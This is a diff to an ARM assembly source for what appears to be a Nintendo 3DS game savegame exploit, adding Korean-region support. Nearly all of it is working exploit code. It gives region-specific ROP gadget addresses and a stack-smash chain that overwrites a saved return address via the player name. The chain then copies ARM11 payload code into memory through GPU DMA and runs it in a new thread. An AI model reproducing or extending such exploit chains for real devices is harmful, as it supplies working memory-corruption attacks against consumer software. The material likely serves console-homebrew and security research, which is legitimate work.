@@ -2,8 +2,11 @@
 .section .init
 .global _start
 
-//Note that all code addresses in the form of L_<addr> referenced here are for the USA game.
+#if REGION==3 && (FWVER < 0x25 || EXECHAX != 2)
+#error Kor version not support this setting
+#endif
 
+//Note that all code addresses in the form of L_<addr> referenced here are for the USA game.
 #if REGION!=0//Non-JPN
 #define svcControlMemory 0x301a0c
 #define svcConnectToPort 0x2fa7b8
@@ -14,7 +17,9 @@
 #define svcGetProcessId 0x307464
 #endif
 
-#if REGION!=0//Non-JPN
+#if REGION==3//Kor
+#define srv_GetServiceHandle 0x320f80
+#elif REGION!=0//Non-JPN
 #define srvinit_RegisterClient 0x30df98 //Calls srv_RegisterClient(), increments *r6, L_30aedc(sp+0), then executes "pop {r3, r4, r5, r6, r7, pc}". L_30aedc decreases *(inr0+8) by 1, and returns if that's >0 after decreasing it.
 #define srv_GetServiceHandle 0x30dde8
 #else//JPN
@@ -22,11 +27,19 @@
 #define srv_GetServiceHandle 0x30d900
 #endif
 
+#if REGION!=3//Non-KOR
 #define GETPROCID 0x409bec //Calls svcGetProcessId, "mov r0, r4", then pop {r3, r4, r5, pc}
 #define CLOSEHANDLE 0x400ae4+4 //mov r4, r0. ptr = inr0, if(*ptr)svcCloseHandle(*ptr). *ptr = 0, r0 = ptr, "pop {r4, pc}".
 #define COND_THROWFATALERR 0x2135ec //This calls THROWFATALERR if r0 bit31 is set, then executes: pop {r3, r4, r5, r6, r7, r8, r9, pc}
+#else//KOR
+#define COND_THROWFATALERR 0x3211cc
+#endif
 
-#if REGION!=0//Non-JPN
+#if REGION==3//KOR
+#define THROWFATALERR 0x2dcc694
+#define ADDSHIFTVAL_BLXR3 0x2acdf4
+#define SLEEP_THREAD 0x31cff8
+#elif REGION!=0//Non-JPN
 #define THROWFATALERR 0x3351b4
 #define GETTHREADSTORAGE 0x2db5ac //Stores r0 from "mrc 15, 0, r0, cr13, cr0, {3}" to r3+4, increments the word @ r3+8, r0=1 then pop {r4} bx	lr
 #define LDRR0 0x2d1230 //ldr r0, [r0] then bx lr
@@ -40,7 +53,11 @@
 #define SLEEP_THREAD 0x30e11c
 #endif
 
+#if REGION!=3//Non-KOR
 #define GSPGPU_HANDLEADR 0x00558aac
+#else//KOR
+#define GSPGPU_HANDLEADR 0x00566e44
+#endif
 
 #define CODE_ALIGNEDSIZE 0x45b000
 
@@ -66,6 +83,11 @@
 #define THREADINIT_LOCALSTORAGE 0x435f8c
 #define svcCreateThread 0x4221a4
 #define ROP_POPR3_ADDSPR3_POPPC 0x4a5ae4
+#elif REGION==3 //KOR
+#define GXLOWCMD_4 0x179f20
+#define GSP_CMD8 0x16fe34
+#define svcCreateThread 0x10bf3c
+#define ROP_POPR3_ADDSPR3_POPPC 0x187f28
 #elif REGION==0 //JPN
 #define SENDCMDADR 0x436078
 #define GXLOWCMD_0 0x493964
@@ -78,7 +100,14 @@
 #error Invalid region.
 #endif
 
-#if REGION!=0//Non-JPN
+#if REGION==3//KOR
+#define MEMCPY 0x31f084
+#define DSP_SHUTDOWN 0x320f80
+
+#define BLXR3 0x16c8f0
+#define BLXR5 0x17d120
+#define ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 0x2acdf4
+#elif REGION!=0//Non-JPN
 #define RDSAVEBEGINADR 0x324eac+4
 #define WRSAVEBEGINADR 0x2e613c+4
 #define SAVECTXDESTORYADR 0x31b99c+0xc
@@ -106,6 +135,7 @@
 #define DSP_SHUTDOWN 0x2ce330
 #endif
 
+#if REGION!=3//Non-KOR
 #define REGPOPADR 0x4a5c80 //Addr of this instruction: "pop {r0, r1, r2, r3, r4, r5, r6, fp, ip, pc}"
 #define REGPOP24ADR 0x1aca7c //Addr of this instruction: "pop {r4, r5, r6, r7, r8, r9, sl, fp, pc}"
 #define REGPOPR0R3SL 0x4a8964 //Addr of this instruction: "pop {r0, r1, r2, r3, sl, ip, pc}"
@@ -114,10 +144,24 @@
 #define STACKMEMCPYADR 0x1aa988
 
 #define ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC 0x174de8 //"str r4, [r0, #0x2b0]" "pop {r4, r5, r6, pc}"
+#else//KOR
+#define REGPOPADR 0x1888a4
+#define ROP_WRITER4_TOR0_x2b0_POPR4R5R6PC 0x22426c
+#define REGPOP24ADR 0x100590
+#define STACKMEMCPYADR 0x25a080
+
+#define REGPOPR0R3SL 0x2dcc694
+#endif
+
 
 #define RSAINFO_OFF 0x880+0x40
 
+#if REGION!=3//Non-KOR
 #define SAVEADR 0x587958
+#else//KOR
+#define SAVEADR 0x595fd0
+#endif
+
 #define SAVESLOTSADR 0x55bec0
 #define SRVACCESS_OFF 0xf00 //Savegame offset for the new service access control.
 #define ARM9CODE_OFF 0xb00+0x40
@@ -174,6 +218,7 @@
 #define HEAPOFF_ARM9CODE 0x4
 #endif
 
+#if REGION!=3
 .macro SENDCMD HANDLE, CMDID, BUF
 .word REGPOPADR
 .word 0, 0, 0 @ r0-r2
@@ -239,6 +284,7 @@
 .word 0, 0, 0, 0, 0, 0, 0
 #endif
 .endm
+#endif
 
 _start:
 .word 0xbb, 0x01, 0x8000, 0xe0ba, 0x1, 0x57, 0x57
@@ -272,7 +318,11 @@ _start:
 .byte 0xff, 0x07, 0x00, 0x00, 0xff, 0xdf, 0x7f, 0xb7
 .word 0x6f40, 0x4, 0x0
 .word 0x7fff, 0xc0, 0xfa6f, 0xf3f7e3ff
+#if REGION!=3//Non-KOR
 .word 0x253060
+#else//KOR
+.word 0x3c419c
+#endif
 
 .word REGPOPADR @ This is the word which overwrites the saved LR with the stack-smash, thus this is the start of the ROP-chain. This is located at offset 0x14c in the savefile, relative to the playername string it's +0x130.
 .word 0 @ r0: Doesn't matter here, since the code jumped to immediately does "mov r0, sp".
@@ -620,6 +670,7 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word 0x14700000 @ r0, Dst
 .word SAVEADR+ARM11CODE_OFF @ r1, Src ARM11 code
 .word ARM11CODE_SIZE @ r2
+#if REGION!=3//Non-KOR
 .word 0 @ r3
 .word 0x0f @ r4
 .word 0 @ r5
@@ -627,8 +678,17 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word 0 @ fp
 .word 0 @ ip
 .word BLXR6
-
 .word 0, 0 @ d8
+#else//KOR
+.word MEMCPY @ r3
+.word 0 @ r4
+.word 0x0f @ r5
+.word 0 @r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR3
+#endif
+
 .word 0 @ r4
 .word 0 @ r5
 .word 0 @ r6
@@ -641,6 +701,7 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word 0x14700000 @ r0, Addr
 .word ARM11CODE_SIZE @ r1, Size
 .word 0 @ r2
+#if REGION!=3//Non-KOR
 .word 0 @ r3
 .word 0x0f @ r4
 .word 0 @ r5
@@ -648,8 +709,17 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word 0 @ fp
 .word 0 @ ip
 .word BLXR6 @ Flush the DCache for the code copied to 0x14700000.
-
 .word 0, 0 @ d8
+#else//KOR
+.word GSP_CMD8 @ r3
+.word 0 @ r4
+.word 0xf @ r5
+.word 0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR3
+#endif
+
 .word 0 @ r4
 .word 0 @ r5
 .word 0 @ r6
@@ -664,6 +734,7 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word (gxcpy_appmemtype_ropword-_start) + SAVEADR @ r0
 .word 0x1FF80030-4 @ r1
 .word 0 @ r2
+#if REGION!=3//Non-KOR
 .word 0 @ r3
 .word 0x10 @ r4
 .word 0 @ r5
@@ -671,8 +742,17 @@ SENDCMD SAVEADR+0x1040, 0x00190040, SAVEADR+0x1200 @ ReloadDBS
 .word 0 @ fp
 .word 0 @ ip
 .word BLXR6 @ Copy configmem APPMEMTYPE to gxcpy_appmemtype_ropword.
-
 .word 0, 0
+#else//KOR
+.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r3
+.word 0 @ r4
+.word 0x10 @ r5
+.word 0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR3
+#endif
+
 .word 0
 .word 0
 .word 0, 0, 0, 0, 0
@@ -683,8 +763,13 @@ gxcpy_appmemtype_ropword:
 .word 0 @ r1
 .word 0 @ r2
 .word 0 @ r3
+#if REGION!=3//Non-KOR
 .word 0 @ r4
 .word SAVEADR+0x1018 @ r5, +0x38 is a classptr.
+#else//KOR
+.word SAVEADR+0x1018 @ r4
+.word 0 @ r5
+#endif
 .word 0 @ r6
 .word 0 @ fp
 .word 0 @ ip
@@ -709,6 +794,7 @@ gxcpy_appmemtype_ropword:
 gxcpy_appmemsizeptr_ropword:
 .word 0x0 @ r1, written by the above ROP.
 .word (0x14000000 - TEXT_APPMEM_OFFSET)>>3 @ r2
+#if REGION!=3//Non-KOR
 .word 0 @ r3
 .word 0x0f @ r4
 .word 0 @ r5
@@ -718,6 +804,15 @@ gxcpy_appmemsizeptr_ropword:
 .word BLXR6 @ Calculate the linearmem address of .text on-the-fly.
 
 .word 0, 0
+#else//KOR
+.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r3
+.word 0 @ r4
+.word 0x0f @ r5
+.word 0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR3
+#endif
 .word 0
 .word 0
 .word 0, 0, 0, 0, 0
@@ -726,6 +821,7 @@ gxcpy_appmemsizeptr_ropword:
 .word (gxcpy_dstaddr-_start) + SAVEADR @ r0
 .word ((gxcpy_dstaddr_ropword-4)-_start) + SAVEADR @ r1
 .word 0 @ r2
+#if REGION!=3//Non-KOR
 .word 0 @ r3
 .word 0x10 @ r4
 .word 0 @ r5
@@ -735,6 +831,15 @@ gxcpy_appmemsizeptr_ropword:
 .word BLXR6 @ Copy gxcpy_dstaddr_ropword to gxcpy_dstaddr.
 
 .word 0, 0
+#else//KOR
+.word ROP_LDRR1R1_ADDR1R1R2LSL3_STRR1R0 @ r3
+.word 0 @ r4
+.word 0x10 @ r5
+.word 0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR3
+#endif
 .word 0
 .word 0
 .word 0, 0, 0, 0, 0
@@ -745,7 +850,8 @@ gxcpy_dstaddr_ropword:
 .word 0x0 @ r1, GPU DMA dst addr. The actual addr gets written by the above ROP.
 .word ARM11CODE_SIZE @ r2, size
 .word 0 @ r3, width0
-.word 0x0f @ r4
+.word 0 @ r4
+#if REGION!=3//Non-KOR
 .word 0 @ r5
 .word GXLOWCMD_4 @ r6
 .word 0 @ fp
@@ -758,11 +864,27 @@ gxcpy_dstaddr_ropword:
 .word 0, 0, 0, 0, 0
 .word COND_THROWFATALERR
 .word 0, 0, 0, 0, 0, 0, 0
+#else//KOR
+.word GXLOWCMD_4 @ r5
+.word 0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR5
+
+.word 0 @ r4 insp0 = height0
+.word 0 @ r5 insp4 = width1
+.word 0 @ r6 insp8 = height1
+.word 0x8 @ r7 insp12 = flags
+.word 0 @ r8
+.word COND_THROWFATALERR
+.word 0
+#endif
 
 .word REGPOPADR @ Call sleep_thread() since GX commands returns before the operation finishes.
 .word 1000000000 @ r0
 .word 0 @ r1
 .word 0 @ r2
+#if REGION!=3//Non-KOR
 .word 0 @ r3
 .word 0x0f @ r4
 .word 0 @ r5
@@ -772,6 +894,16 @@ gxcpy_dstaddr_ropword:
 .word BLXR6
 
 .word 0, 0 @ d8
+#else//KOR
+.word SLEEP_THREAD @ r3
+.word 0 @ r4
+.word 0x0f @ r5
+.word 0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR3
+#endif
+
 .word 0
 .word 0, 0, 0, 0, 0, 0
 .word 0x00100000
@@ -1517,6 +1649,7 @@ appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-re
 .word REGPOPADR @ r1, func entrypoint
 .word 0 @ r2, thread arg r0
 .word SAVEADR+0x180 @ r3, stacktop
+#if REGION!=3//Non-KOR
 .word 0x0f @ r4
 .word 0 @ r5
 .word svcCreateThread @ r6
@@ -1532,6 +1665,20 @@ appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-re
 .word 0 @ r8
 .word 0 @ r9
 .word 0 @ sl
+#else//KOR
+.word 0 @ r4
+.word svcCreateThread @ r5
+.word 0 @ r6
+.word 0 @ fp
+.word 0 @ ip
+.word BLXR5
+
+.word 0x2d @ r4
+.word ~1 @ r5
+.word 0 @ r6
+.word 0 @ r7
+.word 0 @ r8
+#endif
 
 .word ROP_POPR3_ADDSPR3_POPPC
 
